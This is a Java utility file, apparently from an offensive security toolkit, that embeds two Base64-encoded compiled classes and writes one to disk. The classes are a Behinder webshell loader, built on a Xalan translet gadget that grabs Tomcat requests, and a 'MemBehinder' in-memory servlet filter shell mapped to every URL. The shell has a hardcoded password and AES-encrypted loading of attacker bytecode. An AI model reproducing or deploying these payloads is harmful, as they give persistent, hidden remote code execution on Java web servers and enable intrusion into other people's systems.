package cn.safe6.util;


import net.bytebuddy.ByteBuddy;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Arrays;
import java.util.Base64;

public class GetByteCode {

    public static void main(String[] args) throws Exception {
        decodeData();
        //encodeData();
    }

    public static void decodeData() throws ClassNotFoundException {

        String data ="yv66vgAAADQAzwoAPQBaCgADAFsHAFwKACsAXQcAXgoAKwBfCgBgAGEKAGAAYgoABQBjCgBkAGUKAGQAZggAZwoAMABoBwBpCgBkAGoIAGsKAGwAbQgAbggAbwcAcAgAcQgAcggAcwoABQB0CAB1BwB2CwAaAHcLABoAeAcAeQgAegcAewoAHwB8BwB9CgAhAH4KACEAfwgAgAoAIQCBBwCCCgAmAFoKACYAgwcAhAgAhQcAhgcAhwkAMgCICgArAIkKAIoAYQcAiwoAKwCMBwCNCgAyAI4KAIoAjwgAkAoAKwCRBwCSBwCTCgCUAJUKAAMAlgcAlwoAOwB0BwCYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACGdldEZpZWxkAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAA1TdGFja01hcFRhYmxlBwCZBwCGBwBeAQAKRXhjZXB0aW9ucwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgcAmgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAg8Y2xpbml0PgcAmwcAnAcAXAcAdgcAeQcAewcAfQcAnQcAngcAlwEAClNvdXJjZUZpbGUBABNCZWhpbmRlckxvYWRlci5qYXZhDAA+AD8MAJ8AoAEAEGphdmEvbGFuZy9PYmplY3QMAKEAogEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgwAowCgBwCZDACkAKUMAKYApwwAPgCoBwCbDACpAKoMAKsArAEAB3RocmVhZHMMAEIAQwEAE1tMamF2YS9sYW5nL1RocmVhZDsMAK0ArgEABGV4ZWMHAJwMAK8AsAEABGh0dHABAAZ0YXJnZXQBABJqYXZhL2xhbmcvUnVubmFibGUBAAZ0aGlzJDABAAdoYW5kbGVyAQAGZ2xvYmFsDACxAD8BAApwcm9jZXNzb3JzAQAOamF2YS91dGlsL0xpc3QMALIAswwApgC0AQAdb3JnL2FwYWNoZS9jb3lvdGUvUmVxdWVzdEluZm8BAANyZXEBABlvcmcvYXBhY2hlL2NveW90ZS9SZXF1ZXN0DAC1ALQBACVvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0DAC2ALcMALgAuQEACmNsYXNzRGF0YTEMALoAuwEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMALwAvQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAPamF2YS9sYW5nL0NsYXNzAQACW0IMAL4AvwwAwADBBwDCAQAOQmVoaW5kZXJMb2FkZXIMAMMAxAEAEWphdmEvbGFuZy9JbnRlZ2VyDAA+AMUMAMYAxwEACmNsYXNzRGF0YTIMAMgAyQEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQcAygwAywDMDADNAM4BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1RocmVhZAEAEGphdmEvbGFuZy9TdHJpbmcBACZvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZQEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1nZXRTdXBlcmNsYXNzAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAPcHJpbnRTdGFja1RyYWNlAQAEc2l6ZQEAAygpSQEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldE5vdGUBAAtnZXRSZXNwb25zZQEAKigpTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOwEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAEKEkpVgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADmdldENvbnN0cnVjdG9yAQAzKFtMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAdamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3IBAAtuZXdJbnN0YW5jZQEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgAhADAAPQAAAAAABQABAD4APwABAEAAAAAdAAEAAQAAAAUqtwABsQAAAAEAQQAAAAYAAQAAAAkACQBCAEMAAgBAAAAAmwADAAUAAAA4AU0qtgACTi0SA6UAFi0rtgAETacADToELbYABk6n/+osxgAOLAS2AAcsKrYACLC7AAVZK7cACb8AAQANABMAFgAFAAIAQQAAADIADAAAAEgAAgBJAAcASwANAE0AEwBOABYATwAYAFAAHQBRACAAVQAkAFYAKQBXAC8AWQBEAAAAEQAE/QAHBwBFBwBGTgcARwkOAEgAAAAEAAEAOwABAEkASgACAEAAAAAZAAAAAwAAAAGxAAAAAQBBAAAABgABAAAAYABIAAAABAABAEsAAQBJAEwAAgBAAAAAGQAAAAQAAAABsQAAAAEAQQAAAAYAAQAAAGUASAAAAAQAAQBLAAgATQA/AAEAQAAAA5UACQAVAAACMwM7uAAKtgALEgy4AA3AAA7AAA5MAz0cK76iAhErHDJOLcYB/C22AA86BBkEEhC2ABGaAewZBBIStgARmQHiLRITuAANOgUBOgYZBcEAFJkAIBkFEhW4AA0SFrgADRIXuAANOganAAo6BxkHtgAYGQbGAa0ZBhIZuAANwAAaOgcDPRwZB7kAGwEAogGUGQccuQAcAgDAAB06CBkIEh64AA3AAB86CRkJBLYAIMAAIToKGQq2ACI6CxkKtgAjOgwZChIktgAlOg27ACZZtwAnGQ22ACg6DhIpEioGvQArWQMSLFNZBLIALVNZBbIALVO2AC46DxkPBLYALxkPEjC2ADEGvQADWQMZDlNZBLsAMlkDtwAzU1kFuwAyWRkOvrcAM1O2ADTAACs6EBkKEjW2ACU6EbsAJlm3ACcZEbYAKDoSEikSKga9ACtZAxIsU1kEsgAtU1kFsgAtU7YALjoTGRMEtgAvGRMSMLYAMQa9AANZAxkSU1kEuwAyWQO3ADNTWQW7ADJZGRK+twAzU7YANMAAKzoUGRQEvQArWQMZEFO2ADYEvQADWQMZEAW9ACtZAxI3U1kEEjhTtgA2Bb0AA1kDGQpTWQQZC1O2ADlTtgA5B70AA1kDGQpTWQQZC1NZBRkMU1kGGRAFvQArWQMSN1NZBBI4U7YANgW9AANZAxkKU1kEGQtTtgA5U7YAOlenAAo6DRkNtgA8BDunAAMamQAGpwAJhAIBp/3vpwAISyq2ADyxAAMAUQBkAGcABQC+Ag4CEQA7AAACKgItADsAAgBBAAAAvgAvAAAADQACAA4AFAAPABwAEAAgABEAJAASACoAEwA+ABQARgAVAEkAFgBRABgAZAAbAGcAGQBpABoAbgAdAHMAHgB/AB8AjAAgAJkAIQClACIAsAAjALcAJAC+ACYAxwAnANUAKADzACkA+QAqASkAKwEyACwBQAAtAV4ALgFkAC8BlAAxAbgAMgH1ADMCDgA2AhEANAITADUCGAA3AhoAOAIdAD0CIQA+AiQADwIqAEMCLQBBAi4AQgIyAEQARAAAAHQAC/4AFgEHAA4B/wBQAAcBBwAOAQcATgcATwcAUAcAUAABBwBHBvwAEgcAUf8BjwANAQcADgEHAE4HAE8HAFAHAFAHAFEHAFIHAFMHAFQHAFUHAFYAAQcAVwb/AAQABAEHAA4BBwBOAAD6AAb4AAVCBwBXBAABAFgAAAACAFk=";
        String data1 = "yv66vgAAADQBYAEAGU1lbUJlaGluZGVyMzg5MDExOTc1MTI4MDAHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEAHk1lbUJlaGluZGVyMzg5MDExOTc1MTI4MDAuamF2YQEAFGphdmF4L3NlcnZsZXQvRmlsdGVyBwAHAQALcGFnZUNvbnRleHQBAB9MamF2YXgvc2VydmxldC9qc3AvUGFnZUNvbnRleHQ7AQAGcGFzc3dkAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQAiKExqYXZheC9zZXJ2bGV0L2pzcC9QYWdlQ29udGV4dDspVgEAAygpVgwADQAPCgAEABAMAAkACgkAAgASAQAEQ29kZQEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAKRXhjZXB0aW9ucwEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgcAGAEAA21kNQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQADTUQ1CAAcAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0BwAeAQALZ2V0SW5zdGFuY2UBADEoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7DAAgACEKAB8AIgEAEGphdmEvbGFuZy9TdHJpbmcHACQBAAhnZXRCeXRlcwEABCgpW0IMACYAJwoAJQAoAQAGbGVuZ3RoAQADKClJDAAqACsKACUALAEABnVwZGF0ZQEAByhbQklJKVYMAC4ALwoAHwAwAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIHADIBAAZkaWdlc3QMADQAJwoAHwA1AQAGKElbQilWDAANADcKADMAOAEACHRvU3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7DAA6ADsKADMAPAEAC3RvVXBwZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsMAD4APwoAJQBAAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAQgEACXN1YnN0cmluZwEAFihJSSlMamF2YS9sYW5nL1N0cmluZzsMAEQARQoAJQBGAQALdG9Mb3dlckNhc2UMAEgAPwoAJQBJAQANU3RhY2tNYXBUYWJsZQEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QHAE4BACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQcAUAEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247DABSAFMLAE8AVAEABmluamVjdAgAVgEAAm9rCABYAQAJc2V0SGVhZGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylWDABaAFsLAFEAXAEABHRlc3QIAF4BABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0BwBgAQAMZ2V0UGFyYW1ldGVyDABiABsLAGEAYwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgwAZQBmCgAlAGcMAAsADAkAAgBpDAAaABsKAAIAawEAEGphdmEvbGFuZy9TeXN0ZW0HAG0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsMAG8AcAkAbgBxAQAK5pS25YiwLS0tLQgAcwEAE2phdmEvaW8vUHJpbnRTdHJlYW0HAHUBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAB3AHgKAHYAeQEAAXUIAHsBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24HAH0BAAhwdXRWYWx1ZQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgwAfwCACwB+AIEBAB1qYXZheC9zZXJ2bGV0L2pzcC9QYWdlQ29udGV4dAcAgwEACnNldFJlcXVlc3QBACEoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7KVYMAIUAhgoAhACHAQALc2V0UmVzcG9uc2UBACIoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWDACJAIoKAIQAiwEAA0FFUwgAjQEAE2phdmF4L2NyeXB0by9DaXBoZXIHAI8BACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwwAIACRCgCQAJIBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjBwCUAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgcAlgoAlwAQAQAIZ2V0VmFsdWUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwwAmQCaCwB+AJsBAAZhcHBlbmQBACwoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwwAnQCeCgCXAJ8BAAAIAKEBACwoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwwAnQCjCgCXAKQMADoAPwoAlwCmAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYMAA0AqAoAlQCpAQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYMABUAqwoAkACsAQAJZ2V0UmVhZGVyAQAaKClMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsMAK4ArwsAYQCwAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgcAsgEACHJlYWRMaW5lDAC0AD8KALMAtQEAFWphdmEubGFuZy5DbGFzc0xvYWRlcggAtwEAD2phdmEvbGFuZy9DbGFzcwcAuQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7DAC7ALwKALoAvQEAC2RlZmluZUNsYXNzCAC/AQACW0IHAMEBABFqYXZhL2xhbmcvSW50ZWdlcgcAwwEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwwAxQDGCQDEAMcBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAMkAygoAugDLAQAiamF2YS9sYW5nL3JlZmxlY3QvQWNjZXNzaWJsZU9iamVjdAcAzQEADXNldEFjY2Vzc2libGUBAAQoWilWDADPANAKAM4A0QEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIHANMKANQAEAEAGXN1bi9taXNjL0NoYXJhY3RlckRlY29kZXIHANYBAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCDADYANkKANcA2gEAB2RvRmluYWwBAAYoW0IpW0IMANwA3QoAkADeAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DADgAOEKAAQA4gEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwA5ADlCgC6AOYBAAQoSSlWDAANAOgKAMQA6QEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcA6wEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwA7QDuCgDsAO8BAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DADxAPIKALoA8woABABnAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgcA9gEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYMAEwA+AsA9wD5AQATamF2YS9pby9JT0V4Y2VwdGlvbgcA+wEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlBwD9AQAHZGVzdHJveQEAEGR5bmFtaWNBZGRGaWx0ZXIBAGQoTGphdmF4L3NlcnZsZXQvRmlsdGVyO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OylWAQARZ2V0U2VydmxldENvbnRleHQBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0OwwBAgEDCwBhAQQBABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0BwEGAQAVZ2V0RmlsdGVyUmVnaXN0cmF0aW9uAQA2KExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb247DAEIAQkLAQcBCgsBBwDiAQAHY29udGV4dAgBDQEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAQ8BEAoAugERAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHARMBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwBFQEWCgEUARcBACtvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25Db250ZXh0BwEZAQAob3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dAcBGwEAJm9yZy9hcGFjaGUvY2F0YWxpbmEvdXRpbC9MaWZlY3ljbGVCYXNlBwEdAQAFc3RhdGUIAR8BACJvcmcvYXBhY2hlL2NhdGFsaW5hL0xpZmVjeWNsZVN0YXRlBwEhAQANU1RBUlRJTkdfUFJFUAEAJExvcmcvYXBhY2hlL2NhdGFsaW5hL0xpZmVjeWNsZVN0YXRlOwwBIwEkCQEiASUBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYMAScBKAoBFAEpAQAJYWRkRmlsdGVyAQBUKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZheC9zZXJ2bGV0L0ZpbHRlcjspTGphdmF4L3NlcnZsZXQvRmlsdGVyUmVnaXN0cmF0aW9uJER5bmFtaWM7DAErASwLAQcBLQEAHGphdmF4L3NlcnZsZXQvRGlzcGF0Y2hlclR5cGUHAS8BAAdSRVFVRVNUAQAeTGphdmF4L3NlcnZsZXQvRGlzcGF0Y2hlclR5cGU7DAExATIJATABMwEAEWphdmEvdXRpbC9FbnVtU2V0BwE1AQACb2YBACUoTGphdmEvbGFuZy9FbnVtOylMamF2YS91dGlsL0VudW1TZXQ7DAE3ATgKATYBOQEAIGphdmF4L3NlcnZsZXQvRmlsdGVyUmVnaXN0cmF0aW9uBwE7AQAYYWRkTWFwcGluZ0ZvclVybFBhdHRlcm5zAQAqKExqYXZhL3V0aWwvRW51bVNldDtaW0xqYXZhL2xhbmcvU3RyaW5nOylWDAE9AT4LATwBPwEAC2ZpbHRlclN0YXJ0CAFBAQAJZ2V0TWV0aG9kDAFDAMoKALoBRAEAB1NUQVJURUQMAUYBJAkBIgFHAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24HAUkBAChqYXZheC9zZXJ2bGV0L0ZpbHRlclJlZ2lzdHJhdGlvbiREeW5hbWljBwFLAQATamF2YS9sYW5nL1Rocm93YWJsZQcBTQEAE1tMamF2YS9sYW5nL09iamVjdDsHAU8BACZvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZQcBUQwADQAOCgACAVMBAAhCZWhpbmRlcggBVQEAAi8qCAFXDAEAAQEKAAIBWQEAD3ByaW50U3RhY2tUcmFjZQwBWwAPCgFOAVwBAApzaGVsbEAyMDIxCAFeACEAAgAEAAEACAACAAEACQAKAAAAAQALAAwAAAAHAAEADQAOAAEAFAAAAB0AAgACAAAAESq3ABEqEwFftQBqKiu1ABOxAAAAAAABABUAFgACABQAAAANAAAAAgAAAAGxAAAAAAAXAAAABAABABkACQAaABsAAQAUAAAAaQAEAAQAAAA8AUwSHbgAI00sKrYAKQMqtgAttgAxuwAzWQQstgA2twA5EBC2AD22AEFMpwAHTqcAAysDEBC2AEe2AEqwAAEAAgAqAC0AQwABAEsAAAATAAL/AC0AAgcAJQcAJQABBwBDAwABAEwATQACABQAAAFuAAgADwAAAS0rwABPOgQswABROgUZBLkAVQEAOgYZBRJXElm5AF0DABkEEl+5AGQCABJZtgBomQD0KrQAargAbDoHsgByEnS2AHoZBhJ8GQe5AIIDACq0ABMrtgCIKrQAEyy2AIwSjrgAkzoIuwCVWbsAl1m3AJgZBhJ8uQCcAgC2AKASorYApbYAp7YAKRKOtwCqOgkZCAUZCbYArRkEuQCxAQC2ALY6ChK4uAC+EsAGvQC6WQMSwlNZBLIAyFNZBbIAyFO2AMw6CxkLBLYA0hkIuwDUWbcA1RkKtgDbtgDfOgwZCyq2AOO2AOcGvQAEWQMZDFNZBLsAxFkDtwDqU1kFuwDEWRkMvrcA6lO2APDAALo6DRkNtgD0KrQAE7YA9VenAAg6DqcAAy0ZBBkFuQD6AwCxAAEATQEaAR0AQwABAEsAAAAnAAL/AR0ACAcAAgcAYQcA/gcA9wcATwcAUQcAfgcAJQABBwBD+gAEABcAAAAGAAIA/AAZAAEA/wAPAAEAFAAAAA0AAAABAAAAAbEAAAAAAAkBAAEBAAIAFAAAAU0ABwAMAAAA5i25AQUBADoEGQQruQELAgABpgDUAToFAToGAToHAToIAToJGQS5AQwBABMBDrYBEjoFGQUEtgDSGQUZBLYBGMABGjoGGQa2AOMTAQ62ARI6BRkFBLYA0hkFGQa2ARjAARw6BxMBHhMBILYBEjoIGQgEtgDSGQgZB7IBJrYBKhkEKyq5AS4DADoJGQmyATS4AToDBL0AJVkDLFO5AUAEABMBHBMBQgG2AUU6ChkKBLYA0hkKGQcBtgDwVxkIGQeyAUi2ASqnABc6C6cAEjoLGQgZB7IBSLYBKhkLvxkIGQeyAUi2ASqxAAIAIwDEAMcAQwAjAMwAzAAAAAEASwAAAEUABP8AxwAKBwAIBwAlBwAlBwBPBwEHBwEUBwEaBwEcBwEUBwFMAAEHAENEBwFODv8ACQAFBwAIBwAlBwAlBwBPBwEHAAAAFwAAAAQAAQFKAAEAZQBmAAEAFAAAAIIABAAIAAAARivAAVBNLAMywABPTiwEMsABUjoELAUywAB+OgUsBjLAAIQ6BrsAAlkZBrcBVBMBVhMBWC24AVqnAA06BxkHtgFdpwADBKwAAQAkADcAOgFKAAEASwAAACIAAv8AOgAHBwACBwAEBwFQBwBPBwFSBwB+BwCEAAEHAUoJAAEABQAAAAIABg==";
        // Class<? extends Class> aClass = ClassLoader.getSystemClassLoader().loadClass(Arrays.toString(Base64.getDecoder().decode(data))).getClass();
        //System.out.println(aClass);
        getFileByBytes(Base64.getDecoder().decode(data1),"load.class");

    }

    public static void encodeData(){
        byte[] code= new ByteBuddy()
                .redefine(javax.servlet.jsp.PageContext.class)
                .name("javax.servlet.jsp.PageContext")
                .make()
                .getBytes();
        System.out.println(Base64.getEncoder().encodeToString(code));
    }


    //将Byte数组转换成文件
    public static void getFileByBytes(byte[] bytes, String fileName) {
        BufferedOutputStream bos = null;
        FileOutputStream fos = null;
        File file = null;
        try {
            file = new File(fileName);
            fos = new FileOutputStream(file);
            bos = new BufferedOutputStream(fos);
            bos.write(bytes);
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (bos != null) {
                try {
                    bos.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (fos != null) {
                try {
                    fos.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }



}
